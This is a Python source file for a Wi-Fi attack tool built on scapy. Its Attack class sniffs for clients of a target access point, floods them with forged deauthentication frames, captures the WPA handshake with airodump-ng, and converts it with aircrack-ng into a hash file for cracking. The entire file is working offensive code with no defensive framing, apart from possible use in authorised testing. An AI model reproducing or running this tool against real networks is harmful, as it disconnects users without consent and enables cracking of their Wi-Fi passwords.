from scapy.all import *
import colors
import time
import os
from threading import Timer
import subprocess
from multiprocessing import Process
from glob import glob
from check_handshake import checkHandshake


class Attack(object):
	"""docstring for Attack"""
	def __init__(self, targetRouterMac,channel):
		self.clients = []
		self.interface = "wlan0mon"
		self.targetRouterMac = targetRouterMac
		self.channel = channel
		self.dir = os.getcwd()
		self.hasHandshake = False
		self.hs = Process(target=self.capture_handshake)
		self.hs.start()

		# starting handshake verifier
		self.verifier = RepeatTimer(1,self.verify_Handshake)
		self.verifier.start()



	def start(self):
		t = AsyncSniffer(prn=self.find_clients, iface=self.interface)
		t.start()
		self.search_client()

		# if the above loop ended, then close everything
		self.hs.terminate() #terminate hash capture
		self.hs.join()
		self.verifier.cancel() # cancel handshake verifier
		t.stop() # stop the deauther
		raise KeyboardInterrupt


	def search_client(self):
		print(colors.O + "[-]" + colors.W +" Total clients: "+colors.GR+ str(len(self.clients)) + colors.W)
		print(colors.O + "[+]" + colors.W + " Searching for clients...")
		timeout = time.time() + 60*2

		while self.hasHandshake == False and time.time() < timeout:
			time.sleep(8)
			if( len(self.clients) != 0 ):
				print(colors.B + "[+]" + colors.W +" Found client ")
				self.deauth_clients()
				
		if(self.hasHandshake):
			print(colors.BOLD+colors.O + "[+]" + colors.W +colors.BOLD+" Captured handshake successfully!" + colors.W)
			return ''
		else:
			print(colors.O + "[-]" + colors.W + " Timeout")
			return ''



	def deauth_clients(self):
	
		if(len(self.clients) != 0):
			print(colors.O + "[+]" + colors.W + " Sending Deauth packet to: ", end=' ')
			for i in self.clients:
				print(colors.BOLD+colors.GR + str(i).upper() + colors.W,end=" ")
				self.deauth(i)
	

	def deauth(self,client):
		packet = RadioTap() / \
         Dot11(type=0,         # Management type
               subtype=12,     # Deauthentication subtype
               addr1=client,
               addr2=self.targetRouterMac,
               addr3=self.targetRouterMac) / \
         Dot11Deauth(reason=7) 
         # sending the deauth packet
		sendp(packet, iface=self.interface,count=5)
		
	

	def find_clients(self,p):
		if p.haslayer(Dot11):
			if p.addr1 and p.addr2:                  # if "from" and "to" mac addr. exists
				p.addr1 = p.addr1.lower()   # router mac         # convert both macs to all lower case     
				p.addr2 = p.addr2.lower()   # client mac      
				if self.targetRouterMac.lower() == p.addr1.lower(): # AP's mac address = packt destination mac !
					if p.type in [1, 2]:             # the type I'm looking for
						if p.addr2 not in self.clients and p.addr2 != '':
							self.clients.append(p.addr2)
		

	def capture_handshake(self):
		try:
			cmd = ["airodump-ng", "-w", os.path.join(self.dir,'capture'), '--output-format', 'pcap', '--write-interval', '1', '--bssid', self.targetRouterMac, '--channel',str(self.channel) ,"wlan0mon"]
			handshake = subprocess.call(cmd,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
		except OSError:
			pass
		

	def verify_Handshake(self):
		file = glob("capture*.cap")[0]
		if(os.path.exists(file)):
			v = checkHandshake(os.path.join(self.dir,file))
			self.hasHandshake = v.verify()
			if(self.hasHandshake):
				time.sleep(1)
				self.convert_cap_hccap()


	def convert_cap_hccap(self):
		# hashcat is much faster for cracking
		try:
			file = glob("capture*.cap")[0]
			cmd = f"aircrack-ng -J {self.targetRouterMac}_hs {os.path.join(self.dir,file)}"
			print(colors.O + "[+]" + colors.W + " Coverting pcap to hccap for cracking.")
			subprocess.call(cmd,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
			print(colors.O + "[+]" + colors.W + f" Saved to {self.targetRouterMac}_hs.hccap")
		except:
			pass



class RepeatTimer(Timer):
    def run(self):
        while not self.finished.wait(self.interval):
            self.function(*self.args, **self.kwargs)